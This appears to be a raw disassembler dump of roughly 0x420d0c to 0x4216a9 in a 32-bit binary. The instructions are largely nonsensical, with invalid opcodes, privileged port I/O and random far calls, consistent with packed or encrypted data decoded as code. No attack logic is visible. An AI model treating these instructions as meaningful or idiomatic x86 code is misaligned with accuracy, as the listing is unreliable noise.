  420d0c:	lea    esi,[ecx]
  420d0e:	cs push edx
  420d10:	jne    0x420d51
  420d12:	fld    st(3)
  420d14:	popf   
  420d15:	rcr    DWORD PTR [ebx],0xaf
  420d18:	jb     0x420d28
  420d1a:	pop    ebp
  420d1b:	add    al,0x26
  420d1d:	add    BYTE PTR [edi],0xcb
  420d20:	xlat   BYTE PTR ds:[ebx]
  420d21:	pop    esp
  420d22:	inc    ecx
  420d23:	rcr    bl,0xd7
  420d26:	xchg   ebp,eax
  420d27:	fstp   TBYTE PTR [esi+0x1d6525fd]
  420d2d:	bound  ecx,QWORD PTR [ebx]
  420d2f:	xchg   edx,eax
  420d30:	fist   DWORD PTR [ebp-0x51]
  420d33:	es and ebp,esi
  420d36:	adc    BYTE PTR [eax+edx*1-0x53],cl
  420d3a:	pop    edi
  420d3b:	mov    ss,WORD PTR [ecx-0x148ff02]
  420d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d42:	push   ecx
  420d43:	pop    esi
  420d44:	jle    0x420d11
  420d46:	and    BYTE PTR [edx],ch
  420d48:	fisttp QWORD PTR [ebx-0x65ba3873]
  420d4e:	and    DWORD PTR [edx-0x34ede3c2],ebp
  420d54:	popa   
  420d55:	mov    dl,0x42
  420d57:	aam    0xf2
  420d59:	ret    
  420d5a:	call   0xeb7f:0x8e75595f
  420d61:	adc    BYTE PTR [edx-0x7efcef14],al
  420d67:	xchg   esp,eax
  420d68:	pop    edi
  420d69:	pop    ss
  420d6a:	mov    bl,0xea
  420d6c:	jo     0x420d33
  420d6e:	(bad)  
  420d6f:	js     0x420ded
  420d71:	jne    0x420d61
  420d73:	fisubr DWORD PTR [ecx+0x25962796]
  420d79:	add    edx,ebx
  420d7b:	jl     0x420d5c
  420d7d:	ja     0x420dd2
  420d7f:	sbb    DWORD PTR [ecx],ebx
  420d81:	cmp    al,0x8f
  420d83:	je     0x420d28
  420d85:	dec    esi
  420d86:	cmc    
  420d87:	into   
  420d88:	mov    BYTE PTR [edi-0x5c9cc62a],bl
  420d8e:	(bad)  
  420d8f:	div    DWORD PTR [esp+eax*4]
  420d92:	push   ebx
  420d93:	and    esi,ebx
  420d95:	sub    dl,BYTE PTR [edi-0x480ad8cf]
  420d9b:	bound  ebp,QWORD PTR [ebx]
  420d9d:	je     0x420db6
  420d9f:	jo     0x420e03
  420da1:	icebp  
  420da2:	dec    ebp
  420da3:	mov    BYTE PTR [edx-0x1f],dh
  420da6:	mov    ebp,0x42fe0137
  420dab:	(bad)  
  420dac:	(bad)  
  420dad:	out    0x37,eax
  420daf:	sar    DWORD PTR [ecx-0x2d],0xec
  420db3:	pop    esp
  420db4:	mov    ss,WORD PTR [ebx-0x7d]
  420db7:	outs   dx,BYTE PTR ds:[esi]
  420db8:	aas    
  420db9:	mov    ds:0x45a2d45a,al
  420dbe:	xchg   esi,eax
  420dbf:	pop    edi
  420dc0:	into   
  420dc1:	data16 mov al,0x1
  420dc4:	cmp    al,0x76
  420dc6:	mov    esp,0xda1bab87
  420dcb:	pop    ebp
  420dcc:	mov    al,0x31
  420dce:	std    
  420dcf:	rcr    bh,cl
  420dd1:	cmc    
  420dd2:	lahf   
  420dd3:	sub    BYTE PTR ds:0xd9e2ffaa,al
  420dd9:	sbb    ebx,0x608fcece
  420ddf:	jecxz  0x420e3a
  420de1:	mov    ecx,0x94e373f7
  420de6:	stos   BYTE PTR es:[edi],al
  420de7:	mov    cl,0x47
  420de9:	rcl    DWORD PTR [ebx-0xe],cl
  420dec:	jbe    0x420e25
  420dee:	add    al,0xbd
  420df0:	push   edx
  420df1:	push   edx
  420df2:	addr16 dec esp
  420df4:	push   edx
  420df5:	push   eax
  420df6:	mov    bh,0x3
  420df8:	dec    esi
  420df9:	xor    DWORD PTR [esp+eax*4],ecx
  420dfc:	mov    edx,0x23be3923
  420e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e02:	pop    es
  420e03:	xchg   edi,eax
  420e04:	rol    DWORD PTR [eax+0x5c2bd8dd],1
  420e0a:	in     eax,dx
  420e0b:	pop    edi
  420e0c:	cmp    eax,0xe9913fc4
  420e11:	jne    0x420e44
  420e13:	or     al,0xad
  420e15:	dec    edi
  420e16:	xor    BYTE PTR [edi+0x3aeb1b2a],bh
  420e1c:	xor    bh,BYTE PTR [edx-0x35]
  420e1f:	push   edx
  420e20:	in     al,0xc1
  420e22:	adc    al,0x8c
  420e24:	and    ah,ch
  420e26:	sbb    al,0xe4
  420e28:	aad    0xa9
  420e2a:	sub    ecx,DWORD PTR [esi]
  420e2c:	or     BYTE PTR [edi-0x68],cl
  420e2f:	xlat   BYTE PTR ds:[ebx]
  420e30:	icebp  
  420e31:	mov    dh,0x6d
  420e33:	and    al,0x28
  420e35:	das    
  420e36:	push   edi
  420e37:	(bad)  
  420e39:	outs   dx,BYTE PTR ds:[esi]
  420e3a:	adc    ebx,DWORD PTR [ecx]
  420e3c:	xchg   esp,eax
  420e3d:	xchg   ecx,eax
  420e3e:	inc    bx
  420e40:	shld   DWORD PTR [esi-0x70],ebx,0xa6
  420e45:	dec    DWORD PTR [ebx-0x4d]
  420e48:	xchg   BYTE PTR [ebx+0x1b963b06],ah
  420e4e:	mov    al,ds:0x1bcdd870
  420e53:	les    edi,FWORD PTR [ebx+0x7d]
  420e56:	shl    ah,0xfa
  420e59:	sbb    al,0x26
  420e5b:	jae    0x420e30
  420e5d:	icebp  
  420e5e:	fiadd  DWORD PTR [edx]
  420e60:	push   ss
  420e61:	lock imul ebx,DWORD PTR [ebp-0x65c7ce2d],0xffffffb7
  420e69:	mov    edx,0xe3923e3f
  420e6e:	gs xchg edi,eax
  420e70:	pop    eax
  420e71:	mov    eax,0x4b5f4886
  420e76:	push   ds
  420e77:	daa    
  420e78:	addr16 pop esi
  420e7a:	stos   BYTE PTR es:[edi],al
  420e7b:	pop    ss
  420e7c:	fcom   DWORD PTR [edx-0x20]
  420e7f:	(bad)  
  420e80:	icebp  
  420e81:	cmp    esp,DWORD PTR [ebx+0x14]
  420e84:	and    BYTE PTR [ebx],ch
  420e86:	enter  0xfee9,0x37
  420e8a:	retf   0xc90a
  420e8d:	xor    cl,ah
  420e8f:	push   eax
  420e90:	dec    esp
  420e91:	pop    esi
  420e92:	push   ds
  420e93:	jecxz  0x420e7e
  420e95:	out    dx,eax
  420e96:	jno    0x420e9c
  420e98:	sar    DWORD PTR [ebx+0x59d2bc4],cl
  420e9e:	sbb    eax,0x1c0ba029
  420ea3:	jns    0x420e55
  420ea5:	jns    0x420e8f
  420ea7:	inc    eax
  420ea8:	mov    ?,WORD PTR [ebp-0x47]
  420eab:	add    eax,0xb1dad3d1
  420eb0:	pop    ebx
  420eb1:	push   es
  420eb2:	sbb    al,0xe4
  420eb4:	xor    al,0xc
  420eb6:	call   0x19fb:0x67359f2b
  420ebd:	stos   DWORD PTR es:[edi],eax
  420ebe:	sahf   
  420ebf:	in     eax,0x7
  420ec1:	lds    edx,FWORD PTR [ebp-0x7a2e46ed]
  420ec7:	enter  0x751e,0x31
  420ecb:	scas   ax,WORD PTR es:[edi]
  420ecd:	sub    BYTE PTR [eax+0x20990ad6],ah
  420ed3:	out    0xbc,eax
  420ed5:	shl    DWORD PTR [ebp-0x5c6cf790],cl
  420edb:	mov    bl,0xe6
  420edd:	push   edi
  420ede:	imul   BYTE PTR [edx+eiz*8]
  420ee1:	addr16 pop ss
  420ee3:	xlat   BYTE PTR ds:[ebx]
  420ee4:	dec    ebp
  420ee5:	(bad)  
  420ee6:	or     al,0xfe
  420ee8:	shl    BYTE PTR [ebp-0x5e],0x47
  420eec:	ret    
  420eed:	push   ss
  420eee:	adc    esp,DWORD PTR [ecx+0x9]
  420ef1:	push   ss
  420ef2:	and    BYTE PTR [ebp+ecx*4-0x7f],0xab
  420ef7:	(bad)  
  420ef8:	mov    edx,0xc222ddb7
  420efd:	dec    eax
  420efe:	and    al,0xb6
  420f00:	shl    DWORD PTR [bp+si+0x592e],1
  420f05:	or     DWORD PTR [ebp-0x4d],edi
  420f08:	shl    esp,0x4e
  420f0b:	mov    ds:0x1245bc8,al
  420f10:	dec    ecx
  420f11:	mov    edi,0x3c9434d8
  420f16:	jnp    0x420f04
  420f18:	or     eax,0x9064134a
  420f1d:	mov    al,0x39
  420f1f:	adc    eax,0x8944d5a5
	...
  421100:	push   0xc
  421102:	lea    ebx,[eax-0x1806611]
  421108:	into   
  421109:	out    dx,al
  42110a:	popf   
  42110b:	adc    ebx,ecx
  42110d:	scas   al,BYTE PTR es:[edi]
  42110e:	mov    ?,ebx
  421110:	and    edx,DWORD PTR [ebx+0x71e0001]
  421116:	add    BYTE PTR [eax],al
  421118:	ds xchg ebx,eax
  42111a:	fldl2t 
  42111c:	mov    eax,eax
  42111e:	and    DWORD PTR [ecx+0x2],0xf8989b44
  421125:	inc    ebx
  421126:	mov    esp,DWORD PTR [ebx+0xe846f2e]
  42112c:	xchg   ebp,eax
  42112d:	mov    es,WORD PTR [ebp+0x1f1cb07e]
  421133:	add    eax,0x8b1411f7
  421138:	adc    edx,DWORD PTR [edx]
  42113a:	in     al,dx
  42113b:	imul   ecx,DWORD PTR [ebx],0x6754fd54
  421141:	mov    eax,ds:0x3378e3e4
  421146:	loope  0x421156
  421148:	pop    edx
  421149:	pop    eax
  42114a:	in     al,dx
  42114b:	jmp    0xbdfbfb2b
  421150:	and    ebp,DWORD PTR [ebx]
  421152:	fnstsw WORD PTR [ebx+0x552e9841]
  421158:	push   es
  421159:	out    dx,eax
  42115a:	pop    esp
  42115b:	jo     0x421141
  42115d:	dec    ecx
  42115e:	inc    ecx
  42115f:	jbe    0x421181
  421161:	xor    BYTE PTR [ecx+0x25],0xcc
  421165:	pop    edi
  421166:	pop    esp
  421167:	fld    QWORD PTR [edi+0x6b52ab6a]
  42116d:	les    ecx,FWORD PTR [eax-0x61]
  421170:	push   eax
  421171:	or     BYTE PTR [eax+0x55],dh
  421174:	push   ds
  421175:	sti    
  421176:	jne    0x421152
  421178:	enter  0xb28,0xf6
  42117c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42117d:	adc    dl,BYTE PTR [ebx-0x6f]
  421180:	push   cs
  421181:	mov    esi,DWORD PTR [eax-0x4d]
  421184:	and    DWORD PTR [eax-0x24d9ee21],esp
  42118a:	(bad)  
  42118b:	mov    esp,0x602a00d3
  421190:	pusha  
  421191:	add    dl,ah
  421193:	sbb    DWORD PTR [eax],esp
  421195:	xchg   ecx,eax
  421196:	imul   edi,DWORD PTR [ebx+edx*1],0x3d
  42119a:	aad    0xa9
  42119c:	ins    BYTE PTR es:[edi],dx
  42119d:	push   esi
  42119e:	mov    ds:0x5a3a14ad,eax
  4211a3:	outs   dx,DWORD PTR ds:[esi]
  4211a4:	test   al,0xa9
  4211a6:	mov    WORD PTR [edi],gs
  4211a8:	test   BYTE PTR [ebp+edi*2-0x40],0x33
  4211ad:	(bad)  
  4211ae:	aas    
  4211af:	mov    esi,0x7feb6228
  4211b4:	or     eax,DWORD PTR [eax]
  4211b6:	add    al,0x74
  4211b8:	inc    esp
  4211b9:	pop    eax
  4211ba:	sbb    DWORD PTR [ebx],eax
  4211bc:	add    al,0x94
  4211be:	out    0x13,al
  4211c0:	xchg   ecx,eax
  4211c1:	mov    eax,ds:0xc80df6a7
  4211c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211c7:	loope  0x421205
  4211c9:	or     BYTE PTR [ebx],al
  4211cb:	pop    ss
  4211cc:	xchg   edx,eax
  4211cd:	in     eax,dx
  4211ce:	aaa    
  4211cf:	mov    ss,esp
  4211d1:	pop    edi
  4211d2:	xchg   BYTE PTR [ecx-0x3c],cl
  4211d5:	div    DWORD PTR [ebx+0x19]
  4211d8:	(bad)  
  4211da:	loop   0x421196
  4211dc:	mov    DWORD PTR [ecx+0x17],ecx
  4211df:	test   DWORD PTR ds:0xf75cae98,ebp
  4211e5:	xchg   ebx,eax
  4211e6:	sbb    BYTE PTR [esi],0xe0
  4211e9:	mov    ch,BYTE PTR [ebx+0x2352d0c3]
  4211ef:	xor    edi,DWORD PTR [edi+0x6f]
  4211f2:	cld    
  4211f3:	cmp    DWORD PTR [ebp+edx*2+0x5a],edi
  4211f7:	inc    edx
  4211f8:	not    BYTE PTR [esp+esi*1-0x6c26fd43]
  4211ff:	mov    al,ds:0x46bc07bb
  421204:	mov    BYTE PTR [ebx+0x2c465f40],al
  42120a:	or     eax,0x5be187e7
  42120f:	(bad)  
  421210:	int3   
  421211:	in     al,dx
  421212:	mov    ?,WORD PTR [ebx-0x6f]
  421215:	push   ecx
  421216:	(bad)  
  421217:	xor    DWORD PTR [eax+0x3f],ebp
  42121a:	iret   
  42121b:	cmp    eax,0xa1b3c9b5
  421220:	push   ecx
  421221:	sbb    DWORD PTR [ecx+eiz*8],edi
  421224:	mov    esi,0x6ffe06f2
  421229:	dec    eax
  42122a:	dec    esi
  42122b:	int    0xf4
  42122d:	(bad)  [esi+esi*2+0x66]
  421231:	repnz sbb eax,0xa36e7c5
  421237:	loopne 0x4212b2
  421239:	outs   dx,DWORD PTR ds:[esi]
  42123a:	popa   
  42123b:	mov    ds:0x44d00051,eax
  421240:	mov    dh,0xe7
  421242:	arpl   si,si
  421244:	adc    eax,0x64a4f0b1
  421249:	popa   
  42124a:	std    
  42124b:	jl     0x4211f4
  42124d:	lods   al,BYTE PTR ds:[esi]
  42124e:	loope  0x4212c1
  421250:	popa   
  421251:	nop
  421252:	dec    edi
  421253:	push   0x1
  421255:	clc    
  421256:	shl    DWORD PTR [ecx+0xc],cl
  421259:	jns    0x42120e
  42125b:	retf   0xf1a6
  42125e:	xor    edx,ebp
  421260:	mov    al,0x4a
  421262:	xor    BYTE PTR [edx+0x54c5222e],0x8a
  421269:	mov    ebp,0x6b743dd2
  42126e:	ret    
  42126f:	xchg   ebp,eax
  421270:	in     eax,0xef
  421272:	icebp  
  421273:	leave  
  421274:	aas    
  421275:	pop    ebx
  421276:	cmp    al,0x6e
  421278:	pop    ebp
  421279:	arpl   di,cx
  42127b:	ret    0x471d
  42127e:	sbb    edx,0xffffffb7
  421281:	cs push 0xe4eb3e93
  421287:	or     BYTE PTR [ecx+0x30a77544],0x73
  42128e:	add    eax,0x89ea970e
  421293:	mov    bl,BYTE PTR [esi]
  421295:	(bad)  
  421296:	jbe    0x421312
  421298:	ins    DWORD PTR es:[edi],dx
  421299:	or     eax,0xe56eeac3
  42129e:	mov    al,0x8b
  4212a0:	and    esp,DWORD PTR [edx]
  4212a2:	pop    edi
  4212a3:	arpl   WORD PTR [esi+ebp*2],cx
  4212a6:	cld    
  4212a7:	das    
  4212a8:	in     eax,dx
  4212a9:	adc    al,bl
  4212ab:	xchg   ebp,eax
  4212ac:	jns    0x421319
  4212ae:	dec    edx
  4212af:	(bad)  
  4212b0:	(bad)  
  4212b2:	jg     0x421289
  4212b4:	int    0x79
  4212b6:	test   DWORD PTR [ebx],eax
  4212b8:	xlat   BYTE PTR fs:[ebx]
  4212ba:	sbb    cl,bl
  4212bc:	dec    esi
  4212bd:	ja     0x42132b
  4212bf:	sub    DWORD PTR [esi+ebp*2],0x37
  4212c3:	jb     0x4212c1
  4212c5:	push   edi
  4212c6:	in     al,dx
  4212c7:	leave  
  4212c8:	mov    eax,0x4d934e00
  4212cd:	popf   
  4212ce:	inc    edx
  4212cf:	repz cmp ch,bh
  4212d2:	or     ah,BYTE PTR [ebp+0x7f]
  4212d5:	jae    0x4212d6
  4212d7:	xlat   BYTE PTR ds:[ebx]
  4212d8:	and    BYTE PTR [edx],0x1b
  4212db:	xchg   ecx,eax
  4212dc:	shr    ebx,0xbf
  4212df:	les    eax,FWORD PTR [esi-0x3a]
  4212e2:	push   0xffffffdc
  4212e4:	mov    dh,0x52
  4212e6:	or     al,0xcd
  4212e8:	ror    DWORD PTR [ebx+0x33],cl
  4212eb:	cli    
  4212ec:	lea    eax,[eax]
  4212ee:	add    DWORD PTR [ecx],0xa034a5c
  4212f4:	jmp    0x421353
  4212f6:	imul   edi,esp,0x1e
  4212f9:	outs   dx,BYTE PTR ds:[esi]
  4212fa:	xor    esp,edx
  4212fc:	xchg   esp,eax
  4212fd:	jecxz  0x421313
  4212ff:	inc    esp
  421300:	mov    ds:0x34ff2879,al
  421305:	inc    eax
  421306:	dec    esp
  421307:	and    edi,DWORD PTR [edx+0x19b9df12]
  42130d:	xor    ebx,eax
  42130f:	sub    al,0xd3
  421311:	jae    0x42130f
  421313:	mov    WORD PTR [ecx+0x4d],ss
  421316:	icebp  
  421317:	mov    ecx,ebx
  421319:	ret    0xc34a
  42131c:	imul   eax,DWORD PTR [ebp-0x22],0x5a
  421320:	ss jle 0x421327
  421323:	xor    BYTE PTR [ebx+0x2ef9ad8],ah
  421329:	inc    esp
  42132a:	pop    ss
  42132b:	arpl   cx,dx
  42132d:	mov    WORD PTR ds:0xee50593c,es
  421333:	dec    esi
  421334:	out    dx,al
  421335:	enter  0xf900,0x62
  421339:	jl     0x421356
  42133b:	stc    
  42133c:	out    0x98,eax
  42133e:	ror    BYTE PTR [edx-0x6e80d5da],1
  421344:	fnstenv [ebx-0x67]
  421347:	pop    edx
  421348:	jo     0x42134f
  42134a:	xor    cl,dl
  42134c:	sbb    eax,0x3afcf630
  421351:	imul   esi,DWORD PTR [esi+0x52],0x86aeefc
  421358:	cdq    
  421359:	push   ebp
  42135a:	out    0x83,eax
  42135c:	mov    esp,0xf076fa6
  421361:	jle    0x4212fe
  421363:	xor    al,0xc0
  421365:	das    
  421366:	arpl   WORD PTR [esi-0x2c2e2692],sp
  42136c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42136d:	call   0x34b907da
  421372:	push   ebx
  421373:	retf   
  421374:	or     al,0xc1
  421376:	gs loope 0x421346
  421379:	or     edx,DWORD PTR [ebp-0x21]
  42137c:	sbb    BYTE PTR [edi],cl
  42137e:	or     DWORD PTR [edi+ecx*1],edx
  421381:	shr    ch,0xce
  421384:	test   eax,0x67b1f738
  421389:	pop    ecx
  42138a:	jge    0x4213cb
  42138c:	not    DWORD PTR [edx+0x4f430a3a]
  421392:	push   esp
  421393:	imul   BYTE PTR [ebx]
  421395:	mov    esp,DWORD PTR [edi-0x4c]
  421398:	mov    ah,0x52
  42139a:	call   0xf6bc2846
  42139f:	pop    ecx
  4213a0:	fst    DWORD PTR [eax]
  4213a2:	jl     0x4213e2
  4213a4:	fsub   QWORD PTR [edx+0x25870cb7]
  4213aa:	pusha  
  4213ab:	pop    ebp
  4213ac:	adc    eax,0x4d727322
  4213b1:	sbb    ah,al
  4213b3:	or     eax,0xe13e96de
  4213b8:	jae    0x421343
  4213ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213bb:	rcr    BYTE PTR [edi],1
  4213bd:	cdq    
  4213be:	add    BYTE PTR [edx],0x78
  4213c1:	cdq    
  4213c2:	std    
  4213c3:	shl    ah,0x97
  4213c6:	imul   ebx,esp,0x55
  4213c9:	jbe    0x421382
  4213cb:	push   es
  4213cc:	push   esi
  4213cd:	popf   
  4213ce:	mov    al,0x53
  4213d0:	icebp  
  4213d1:	sti    
  4213d2:	repz add al,0xee
  4213d5:	pop    ds
  4213d6:	js     0x421455
  4213d8:	stos   DWORD PTR es:[edi],eax
  4213d9:	mov    DWORD PTR [ecx+0xc],edx
  4213dc:	xor    al,0xac
  4213de:	fldcw  WORD PTR [ebp-0x15]
  4213e1:	push   0xffffff97
  4213e3:	test   eax,0xe593feea
  4213e8:	and    DWORD PTR [ebx+0xc1bb101],ebx
  4213ee:	mov    ch,0xa1
  4213f0:	jno    0x4213ad
  4213f2:	cmp    al,0x77
  4213f4:	push   esp
  4213f5:	pop    ds
  4213f6:	je     0x421460
  4213f8:	shl    DWORD PTR [edx+eiz*8-0x25],0xa0
  4213fd:	xchg   ecx,eax
  4213fe:	loope  0x4213ae
  421400:	dec    ebp
  421401:	push   ds
  421402:	int3   
  421403:	xchg   edi,esi
  421405:	div    DWORD PTR [edi]
  421407:	mov    es,WORD PTR [ebp+0x18229d06]
  42140d:	dec    esp
  42140e:	lds    ebp,FWORD PTR [edx-0x18]
  421411:	mov    edx,0x8774657f
  421416:	out    0xd5,al
  421418:	mov    al,ds:0xbc2e7f96
  42141d:	test   eax,0x114cd92
  421422:	ror    BYTE PTR [esi+0xe],1
  421425:	in     eax,0x99
  421427:	or     dh,BYTE PTR [edi+0x6c26ce30]
  42142d:	js     0x421446
  42142f:	mov    dl,BYTE PTR [eax]
  421431:	outs   dx,DWORD PTR ds:[esi]
  421432:	push   ss
  421433:	fsub   DWORD PTR [ecx-0xb8102ca]
  421439:	leave  
  42143a:	pop    es
  42143b:	adc    cl,ch
  42143d:	xchg   DWORD PTR [ebp-0x190ab5f6],ebp
  421443:	jl     0x42143c
  421445:	inc    edi
  421446:	sub    esp,ebp
  421448:	and    bh,BYTE PTR [ebp+eiz*4+0x73]
  42144c:	jp     0x4214a3
  42144e:	jecxz  0x4213da
  421450:	pop    eax
  421451:	ret    0x42b4
  421454:	fbstp  TBYTE PTR [eax-0x6ff760e1]
  42145a:	bound  ecx,QWORD PTR [edi+0x46920014]
  421460:	fisubr WORD PTR [edx]
  421462:	cld    
  421463:	in     eax,0x3a
  421465:	pop    es
  421466:	shl    BYTE PTR [edx+0x5955554b],1
  42146c:	and    al,0xc0
  42146e:	in     eax,dx
  42146f:	scas   al,BYTE PTR es:[edi]
  421470:	test   DWORD PTR [esi],eax
  421472:	popf   
  421473:	cmc    
  421474:	repz cmc 
  421476:	mov    cl,0x8b
  421478:	repz test eax,0x3fa986a7
  42147e:	(bad)  
  42147f:	lahf   
  421480:	ss nop
  421482:	xor    DWORD PTR [esi+0x5e4d2d55],esp
  421488:	mov    bh,0x48
  42148a:	pop    esp
  42148b:	repz retf 0x9bbe
  42148f:	sbb    eax,DWORD PTR [ebp+0x627fae01]
  421495:	scas   eax,DWORD PTR es:[edi]
  421496:	push   0x694615db
  42149b:	iret   
  42149c:	pusha  
  42149d:	inc    esi
  42149e:	push   ebp
  42149f:	mov    ds:0xa235df70,eax
  4214a4:	fsub   st,st(6)
  4214a6:	mov    BYTE PTR [ebx+eiz*8],bl
  4214a9:	mov    edi,0x2b34ca41
  4214ae:	aas    
  4214af:	xchg   DWORD PTR [ebx],edx
  4214b1:	mul    BYTE PTR [ecx-0x3dd1a880]
  4214b7:	stos   BYTE PTR es:[edi],al
  4214b8:	aas    
  4214b9:	add    cl,BYTE PTR [eax-0x30e848e5]
  4214bf:	push   ds
  4214c0:	sub    eax,0x210de92e
  4214c5:	es imul eax,esi,0xffffffbf
  4214c9:	mov    ebx,0x5cac4473
  4214ce:	mov    edx,0xab0176c0
  4214d3:	inc    esp
  4214d5:	rcr    bh,1
  4214d7:	push   ds
  4214d8:	mov    bh,cl
  4214da:	xor    BYTE PTR [esp+ebx*2-0x1d],cl
  4214de:	daa    
  4214df:	test   DWORD PTR ds:0x5f381db9,ebx
  4214e5:	xor    eax,0xe90f39d
  4214ea:	jg     0x421495
  4214ec:	mov    al,ds:0xa747ad50
  4214f1:	aam    0x8d
  4214f3:	sbb    bh,BYTE PTR [esi-0x37]
  4214f6:	dec    edx
  4214f7:	sub    BYTE PTR [edi+ebx*4-0x31bc34a5],0xde
  4214ff:	addr16 ja 0x421510
  421502:	outs   dx,DWORD PTR ds:[esi]
  421503:	cmp    DWORD PTR [eax],ecx
  421505:	lds    ecx,FWORD PTR [ebx+0x4f68acd7]
  42150b:	inc    edx
  42150c:	mov    WORD PTR [eax-0x33],cs
  42150f:	add    eax,0x7acc26ed
  421514:	pop    ecx
  421515:	popf   
  421516:	push   es
  421517:	fmul   st,st(7)
  421519:	and    dl,BYTE PTR [eax-0x1c]
  42151c:	retf   
  42151d:	aad    0x3c
  42151f:	sbb    eax,0xe26d42b3
  421524:	fs jnp 0x421516
  421527:	dec    ecx
  421528:	int    0x28
  42152a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42152b:	dec    ebx
  42152c:	lahf   
  42152d:	and    DWORD PTR [esi-0x42],esi
  421530:	jns    0x42154d
  421532:	in     al,0x99
  421534:	int3   
  421535:	pop    ebp
  421536:	fst    QWORD PTR [eax-0x75b938df]
  42153c:	test   BYTE PTR [edi+0x12],0x63
  421540:	int3   
  421541:	bound  eax,QWORD PTR [edi]
  421543:	mov    ds:0xbc07d1b0,al
  421548:	jg     0x4214d5
  42154a:	inc    edi
  42154b:	popa   
  42154c:	scas   eax,DWORD PTR es:[edi]
  42154d:	cmp    eax,0xe38b7e44
  421552:	inc    esp
  421553:	push   cs
  421554:	fnstcw WORD PTR [ecx+esi*4-0x34a4bac1]
  42155b:	aam    0x1e
  42155d:	mov    edx,0xf557f26c
  421562:	push   ebp
  421563:	nop
  421564:	xchg   ecx,eax
  421565:	arpl   WORD PTR [ebx],sp
  421567:	icebp  
  421568:	and    eax,0xb3c21918
  42156d:	dec    ecx
  42156e:	dec    ebx
  42156f:	or     BYTE PTR [esi+0x2e068958],ah
  421575:	add    edi,edx
  421577:	dec    ecx
  421578:	add    cl,dl
  42157a:	std    
  42157b:	cmp    ebp,DWORD PTR [ecx+0x46]
  42157e:	pop    ebp
  42157f:	int3   
  421580:	sub    DWORD PTR [ecx],eax
  421582:	xor    eax,0xce5de3bf
  421587:	add    esp,DWORD PTR [edx]
  421589:	inc    esi
  42158a:	into   
  42158b:	aam    0x44
  42158d:	sub    BYTE PTR [eax],ah
  42158f:	mov    esp,0x970a2aa5
  421594:	or     esi,DWORD PTR [eax+0x2693a1ec]
  42159a:	out    dx,eax
  42159b:	je     0x421557
  42159d:	data16 sub dl,dl
  4215a0:	adc    al,ch
  4215a2:	add    DWORD PTR [ebp+0x67],ebp
  4215a5:	sub    esp,DWORD PTR [esi]
  4215a7:	sbb    al,bl
  4215a9:	mov    BYTE PTR [edi+ebx*2+0x38854c58],dl
  4215b0:	test   eax,0x564583c1
  4215b5:	repnz mov BYTE PTR [ebx-0x1b],0xbb
  4215ba:	(bad)  
  4215bb:	leave  
  4215bc:	or     edx,DWORD PTR [esp+eiz*2]
  4215bf:	mov    ch,0x0
  4215c1:	popf   
  4215c2:	jnp    0x42157a
  4215c4:	in     al,dx
  4215c5:	and    ah,dl
  4215c7:	pop    esi
  4215c8:	mov    esi,0xb971e68d
  4215cd:	outs   dx,BYTE PTR ds:[esi]
  4215ce:	test   si,bp
  4215d1:	lds    esp,FWORD PTR [esi-0x77]
  4215d4:	mov    cl,0x8a
  4215d6:	and    eax,0xd873e909
  4215db:	mov    al,0x38
  4215dd:	sbb    al,0xa1
  4215df:	sbb    eax,0x5d59b704
  4215e4:	add    BYTE PTR [ecx-0x5a],ah
  4215e7:	mov    ds:0xd2f5d6fd,al
  4215ec:	inc    esp
  4215ed:	(bad)  
  4215ee:	mov    ch,0x24
  4215f0:	jle    0x4215a7
  4215f2:	adc    al,0x5d
  4215f4:	cmp    edx,esp
  4215f6:	lods   eax,DWORD PTR ds:[esi]
  4215f7:	dec    ecx
  4215f8:	inc    ebp
  4215f9:	sub    esp,DWORD PTR [esi]
  4215fb:	test   BYTE PTR [esi+esi*8-0x35],bl
  4215ff:	pop    eax
  421600:	xchg   ebx,eax
  421601:	int    0xd6
  421603:	jmp    0x421674
  421605:	iret   
  421606:	andnps xmm2,XMMWORD PTR [ecx]
  421609:	test   DWORD PTR [edi],0x88d94323
  42160f:	hlt    
  421610:	rol    DWORD PTR [esi-0x2f442a2a],1
  421616:	or     al,0xfa
  421618:	imul   esp,esi,0xffffff99
  42161b:	jns    0x421634
  42161d:	retf   0x1170
  421620:	push   ebp
  421621:	inc    ecx
  421622:	in     al,0x3
  421624:	pop    esp
  421625:	cmp    al,0x47
  421627:	jbe    0x4215b1
  421629:	xchg   WORD PTR [edx],dx
  42162c:	inc    esi
  42162d:	test   esi,esi
  42162f:	jl     0x42160d
  421631:	jo     0x4215da
  421633:	or     DWORD PTR [eax-0x3ddf873c],esi
  421639:	shr    DWORD PTR [ebx-0x54904132],0x15
  421640:	dec    esi
  421641:	mov    ds:0x277da2c9,al
  421646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421647:	sbb    eax,0x1c8fad95
  42164c:	out    dx,al
  42164d:	xor    eax,0x672d6351
  421652:	dec    ebp
  421653:	loopne 0x42160e
  421655:	(bad)  
  421656:	fucomip st,st(1)
  421658:	ficom  WORD PTR [eax]
  42165a:	cli    
  42165b:	add    ebx,ebp
  42165d:	xchg   DWORD PTR [ecx+0x52],ebx
  421660:	stos   BYTE PTR es:[edi],al
  421661:	ss scas al,BYTE PTR es:[edi]
  421663:	adc    al,0x95
  421665:	jg     0x4216c4
  421667:	aam    0x57
  421669:	jno    0x4216e2
  42166b:	scas   al,BYTE PTR es:[edi]
  42166c:	addr16 dec ecx
  42166e:	cmp    al,0xc1
  421670:	ins    BYTE PTR es:[edi],dx
  421671:	addr16 pop ebp
  421673:	adc    ah,ch
  421675:	je     0x4216b6
  421677:	jb     0x421603
  421679:	int3   
  42167a:	and    BYTE PTR [edx-0x3b],0xa7
  42167e:	lds    eax,FWORD PTR [eax-0x14514fa]
  421684:	cmp    ebp,DWORD PTR [ecx+0x8]
  421687:	push   ecx
  421688:	addr16 mov edi,0x1ed70831
  42168e:	xchg   ecx,eax
  42168f:	(bad)  
  421690:	sub    BYTE PTR [esi+0x185dfb4b],dl
  421696:	or     DWORD PTR [edx],esi
  421698:	mov    dl,BYTE PTR [eax-0x7c7a85ff]
  42169e:	sub    cl,BYTE PTR [ebp+0xc]
  4216a1:	adc    eax,0xdd41806
  4216a6:	rol    al,1
  4216a8:	xchg   esi,eax
  4216a9:	rcr    ah,0x22
